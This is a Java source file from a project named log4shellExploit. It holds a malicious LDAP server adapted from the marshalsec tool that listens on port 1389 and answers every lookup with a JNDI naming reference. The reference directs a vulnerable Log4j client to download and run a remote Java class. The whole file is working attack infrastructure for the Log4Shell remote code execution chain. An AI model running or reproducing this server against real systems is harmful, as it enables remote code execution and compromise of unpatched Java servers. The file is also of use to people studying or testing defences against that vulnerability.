package com.zaneoblaneo.log4shellExploit;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.zaneoblaneo.ZaneUtil.console.Console;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAPRefServerRipped {
	// https://github.com/mbechler/marshalsec
	// was ripped from marshalsec-0.0.3-SNAPSHOT-all/marshalsec/jndi/LDAPRefServer and modified to allow it to be run as a thread within this app, and not standalone
	private static final String LDAP_BASE = "a=fdsa,dc=example,dc=com";

	public LDAPRefServerRipped() {
	}

	public static void start(String url) {
		int port = 1389;
		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
			config.setListenerConfigs(
					new InMemoryListenerConfig(
							"listen",
							InetAddress.getByName("0.0.0.0"),
							port,
							ServerSocketFactory.getDefault(),
							SocketFactory.getDefault(),
							(SSLSocketFactory) SSLSocketFactory.getDefault()
					)
			);
			config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
			Console.logln("LDAP Listening on 0.0.0.0:" + port);
			ds.startListening();
		} catch (Exception var4) {
			var4.printStackTrace();
		}

	}

	private static class OperationInterceptor extends InMemoryOperationInterceptor {
		private final URL codebase;

		public OperationInterceptor(URL cb) {
			this.codebase = cb;
		}

		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base = result.getRequest().getBaseDN();
			Entry e = new Entry(base);

			try {
				this.sendResult(result, base, e);
			} catch (Exception var5) {
				var5.printStackTrace();
			}

		}

		protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
			URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
			Console.logln("Send LDAP reference result for " + base + " redirecting to " + turl);
			e.addAttribute("javaClassName", "foo");
			String cbstring = this.codebase.toString();
			int refPos = cbstring.indexOf(35);
			if (refPos > 0) {
				cbstring = cbstring.substring(0, refPos);
			}

			e.addAttribute("javaCodeBase", cbstring);
			e.addAttribute("objectClass", "javaNamingReference");
			e.addAttribute("javaFactory", this.codebase.getRef());
			Console.debugln(e.toString());
			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
			Console.debugln(result);
		}
	}
}
